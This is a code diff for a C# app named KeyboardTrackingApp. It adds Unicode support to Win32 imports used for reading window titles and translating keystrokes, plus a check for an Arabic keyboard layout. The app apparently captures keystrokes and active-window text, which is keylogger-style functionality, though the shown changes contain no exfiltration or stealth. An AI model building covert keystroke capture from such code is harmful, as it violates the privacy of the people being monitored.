@@ -28,13 +28,13 @@ namespace KeyboardTrackingApp
         [DllImport("user32.dll")]
         public static extern IntPtr GetForegroundWindow();
 
-        [DllImport("user32.dll")]
+        [DllImport("user32.dll" , CharSet = CharSet.Unicode)]
         public static extern IntPtr SendMessage(IntPtr hWnd , uint Msg , IntPtr wParam , StringBuilder lParam);
 
         [DllImport("user32.dll")]
         public static extern bool SetForegroundWindow(IntPtr hWnd);
 
-        [DllImport("user32.dll")]
+        [DllImport("user32.dll" , CharSet = CharSet.Unicode)]
         public static extern bool GetWindowText(IntPtr hWnd , StringBuilder text , int count);
 
         [DllImport("user32.dll" , CharSet = CharSet.Auto)]
@@ -46,11 +46,13 @@ namespace KeyboardTrackingApp
         [DllImport("user32.dll")]
         private static extern uint MapVirtualKey(uint uCode , uint uMapType);
 
-        [DllImport("user32.dll")]
+        [DllImport("user32.dll" , CharSet = CharSet.Unicode)]
         private static extern int ToUnicode(uint wVirtKey , uint wScanCode , byte[] pKeyState , StringBuilder pChar , int wCharSize , uint wFlags);
 
         [DllImport("user32.dll" , SetLastError = true)]
         private static extern IntPtr FindWindowEx(IntPtr parentHandle , IntPtr childAfter , string lpszClass , string lpszWindow);
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetKeyboardLayout(uint idThread);
 
         private const uint WM_GETTEXT = 0x000D;
         private const uint WM_GETTEXTLENGTH = 0x000E;
@@ -98,7 +100,7 @@ namespace KeyboardTrackingApp
             if (foregroundWindow != _lastActiveWindowHandle)
             {
                 _lastActiveWindowHandle = foregroundWindow;
-                StringBuilder sb = new StringBuilder(256);
+                StringBuilder sb = new StringBuilder(256); // This should now properly handle Arabic text
                 GetWindowText(foregroundWindow , sb , 256);
                 string newWindowTitle = sb.ToString();
 
@@ -379,6 +381,15 @@ namespace KeyboardTrackingApp
                 }
             }
             return string.Empty;
+        }
+        private void CheckKeyboardLayout()
+        {
+            IntPtr layout = GetKeyboardLayout(0); // 0 means to get the layout of the current thread.
+            int languageCode = layout.ToInt32() & 0xFFFF; // The low word contains the language identifier.
+            if (languageCode == 0x0C01) // 0x0C01 is the hexadecimal code for Arabic (Saudi Arabia).
+            {
+                Console.WriteLine("Arabic keyboard layout is active.");
+            }
         }
     }
 
